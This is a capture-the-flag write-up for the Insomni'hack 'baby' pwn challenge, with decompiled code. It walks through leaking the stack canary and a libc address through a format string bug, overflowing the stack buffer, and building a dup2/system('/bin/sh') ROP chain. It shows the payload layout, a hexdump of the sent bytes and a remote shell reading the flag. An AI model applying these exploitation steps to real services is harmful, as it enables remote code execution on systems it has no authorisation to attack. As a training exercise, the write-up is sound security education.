baby - Pwn - 50 pts - created by grimmlin
==========================================

Baby's first... Should be easy!
Challenge : here (called "baby")
Running on: ```baby.teaser.insomnihack.ch:1337```


Exploit mitigations
=====================
Goal: To bypass NX, stack cookies, ASLR and PIE

```bash
gdb-peda$ checksec 
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

Vulnerabilities
================
- Format string in ```dofmt()```
- Stack-based buffer overflow in ```dostack()```
- Heap-based buffer overflow in  ```doheap()```

Tools used
===========
- pwntools
- GDB PEDA plugin
- radare2
- IDA Pro
- ROPgadget


Strategy:
==========
1. Leak the stack cookie
2. Leak a libc address from the stack and calculate the libc base address
3. Trigger the buffer overflow and get RIP control
4. Do some rop magic


1) Leak the stack cookie 
=========================
Cookie stored at the beginning of the function at [rbp - 8] Ref: [1]

- Prologue
```bash
br *dofmt+17 
   0x7f379ee674d9 <dofmt+17>:   mov    rax,QWORD PTR fs:0x28    // copy canary pointer into RAX
=> 0x7f379ee674e2 <dofmt+26>:   mov    QWORD PTR [rbp-0x8],rax  // copy the canary content into [RBP-0x8]
   0x7f379ee674e6 <dofmt+30>:   xor    eax,eax                  // zero out the canary 

br *dofmt+135
        RAX: 0x83511eb77edda800       
```

    
- Epilogue
```bash
br *dostack+160
   0x7fd9efbe14b2 <dostack+160>:    mov    rcx,QWORD PTR [rbp-0x8]
=> 0x7fd9efbe14b6 <dostack+164>:    xor    rcx,QWORD PTR fs:0x28
   0x7fd9efbe14bf <dostack+173>:    je     0x7fd9efbe14c6 <dostack+180>
   0x7fd9efbe14c1 <dostack+175>:    call   0x7fd9efbe0e30 <__stack_chk_fail@plt>
    
    RCX: 0xec3c87dd37f3f200
```
RCX takes the [RBP-8] and the cookie (fs:0x28) and XOR them. If !=0, then cookie was tampered with.


2) Leak the libc base address 
=============================
TODO


3)  Overflow RIP
================
In order to control the program counter:
```    
Payload  = "A"* 1032 + cookie + RBP + RIP
```

* Registers controlled after crash
```bash
RBP: 0x4545454545454545 ('EEEEEEEE')
RSP: 0x7ffe895c44e8 ("DDDDDDDDAAA%AAsAABAA$AAn
RIP: 0x7fc5e80e94c7 (<dostack+181>: ret)
R13: 0x7ffe895c4650 ("A%pA%TA%qA%UA%r", 'A' <repeats 185 times>...)   //  [R13] --> offset 352 - size ~43
```


4) Build the ROP chain
=======================
According to the x86_64 ABI, the first 6 integer or pointer arguments to a function are passed in registers. 
The first is placed in ```rdi```, the second in ```rsi```, the third in ```rdx```, and then ```rcx```, ```r8``` and ```r9```. 
Only the 7th argument and onwards are passed on the stack.
```
    RDI
    RSI
    RDX
    RCX
    R8
    R9
```

* Finding out ```system()``` address in libc:
```bash
$ rabin2 -is libc.so.remote |grep system
vaddr=0x00137c20 paddr=0x00137c20 ord=225 fwd=NONE sz=70 bind=GLOBAL type=FUNC name=svcerr_systemerr
vaddr=0x00045390 paddr=0x00045390 ord=584 fwd=NONE sz=45 bind=GLOBAL type=FUNC name=__libc_system
vaddr=0x00045390 paddr=0x00045390 ord=1351 fwd=NONE sz=45 bind=UNKNOWN type=FUNC name=system
```

* Finding ROP gadgets:
```bash
$ ROPgadget --binary libc.so.remote --only "pop|ret" | tee gadgets-remote.txt
```

* ROP payload: 

Functions usually return the lowest possible file descriptor. Standard input, output, and error are ```0```, ```1```, and ```2``` respectively. ```socket``` may return ```3```. Then ```accept``` is likely to return ```4```.
```c
dup2(4,0); dup2(4,1); system("/bin/sh")
```

* GDB breakpoints right before the ROP chain
```bash
$ sudo gdb -q -p `pidof baby`
gdb-peda$ br *dostack+180
gdb-peda$ set follow-fork-mode child
gdb-peda$ c
```

Exploit
==========
```bash
[02:53 dudu@xxxxx insomniahack17] > python exploit.py remote remote
[+] Opening connection to baby.teaser.insomnihack.ch on port 1337: Done
[*] 2.dofmt()=> Leaking <__libc_start_main+245> at: 7f129d2be830
[*] 2.dofmt()=> Leaking stack cookie: 7971cd723454900
[*] 1.dostack()=> Building ROP chain
[*] got pwn?
[*] Switching to interactive mode
Good luck !
$ id
uid=1001(baby) gid=1001(baby) groups=1001(baby)
$ ls
baby
flag
$ cat flag
INS{if_you_haven't_solve_it_with_the_heap_overflow_you're_a_baby!}
$  
```

Tricks:
========
* Rename to libc.so.6 and pre-load it:
```
LD_LIBRARY_PATH=. ./baby
```

* Unbelievable debug with pwntools
```bash
$ PWNLIB_DEBUG=1 python exploit.py local ubuntu1404
....
[DEBUG] Received 0x8e bytes:
    "Welcome to baby's first pwn.\n"
    'Pick your favorite vuln : \n'
    '   1. Stack overflow\n'
    '   2. Format string\n'
    '   3. Heap Overflow\n'
    '   4. Exit\n'
    'Your choice > '
[DEBUG] Received 0x22 bytes:
    'How much bytes you want to send ? '
[DEBUG] Sent 0x5 bytes:
    '1152\n'
[DEBUG] Sent 0x480 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000400  41 41 41 41  41 41 41 41  00 9f d0 06  c7 08 1d 87  │AAAA│AAAA│····│····│
    00000410  45 45 45 45  45 45 45 45  9a ab a0 0b  a7 7f 00 00  │EEEE│EEEE│····│····│
    00000420  04 00 00 00  00 00 00 00  85 c8 a0 0b  a7 7f 00 00  │····│····│····│····│
    00000430  00 00 00 00  00 00 00 00  90 3e ad 0b  a7 7f 00 00  │····│····│·>··│····│
    00000440  9a ab a0 0b  a7 7f 00 00  04 00 00 00  00 00 00 00  │····│····│····│····│
    00000450  85 c8 a0 0b  a7 7f 00 00  01 00 00 00  00 00 00 00  │····│····│····│····│
    00000460  90 3e ad 0b  a7 7f 00 00  9a ab a0 0b  a7 7f 00 00  │·>··│····│····│····│
    00000470  c3 48 b6 0b  a7 7f 00 00  90 e5 a2 0b  a7 7f 00 00  │·H··│····│····│····│
    00000480
[*] got pwn?
[*] Switching to interactive mode
[DEBUG] Received 0xc bytes:
    'Good luck !\n'
Good luck !
$ id
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x30 bytes:
    'uid=1002(baby) gid=1002(baby) groups=1002(baby)\n'
uid=1002(baby) gid=1002(baby) groups=1002(baby)
```

References
===========
[1].- https://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/


Decompilation
==============

* handle()
```c
__int64 __fastcall handle(int fd)
{
  char choice; // [sp+10h] [bp-10h]@2
  __int64 cookie; // [sp+18h] [bp-8h]@1

  cookie = *MK_FP(__FS__, 40LL);
  do
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          sendstr(
            fd,
            "Welcome to baby's first pwn.\n"
            "Pick your favorite vuln : \n"
            "   1. Stack overflow\n"
            "   2. Format string\n"
            "   3. Heap Overflow\n"
            "   4. Exit\n"
            "Your choice > ");
          recvlen(fd, (__int64)&choice, 2uLL);
          if ( choice != '2' )
            break;
          dofmt(fd);
        }
        if ( choice > '2' )
          break;
        if ( choice == '1' )
          dostack(fd);
      }
      if ( choice != '3' )
        break;
      doheap(fd);
    }
  }
  while ( choice != '4' );
  return 0LL;
}
```


* dostack()
```c
__int64 __fastcall dostack(int fd)
{
  int len; // ST1C_4@1
  __int64 result; // rax@1
  __int64 v3; // rcx@1
  char buf; // [sp+20h] [bp-410h]@1
  __int64 cookie; // [sp+428h] [bp-8h]@1

  cookie = *MK_FP(__FS__, 40LL);
  sendstr(fd, "How much bytes you want to send ? ");
  recv(fd, &buf, 10uLL, 0);
  len = atoi(&buf);
  recvlen(fd, (__int64)&buf, len);
  sendstr(fd, "Good luck !\n");
  result = 0LL;
  v3 = *MK_FP(__FS__, 40LL) ^ cookie;
  return result;
}
```



* dofmt()
```c
__int64 __fastcall dofmt(int fd)
{
  unsigned int recv; // [sp+1Ch] [bp-414h]@2
  char user_input[1032]; // [sp+20h] [bp-410h]@2
  __int64 cookie; // [sp+428h] [bp-8h]@1

  cookie = *MK_FP(__FS__, 40LL);
  sendstr(fd, "Simply type '\\n' to return\n");
  while ( 1 )
  {
    sendstr(fd, "Your format > ");
    recv = recvlen_until(fd, user_input, 1024uLL, "\n");
    if ( recv == 1 )
      break;
    printf("%d\n", recv);
    puts(user_input);
    user_input[recv] = 0;
    dprintf(fd, user_input);
  }
  return 0LL;
}
```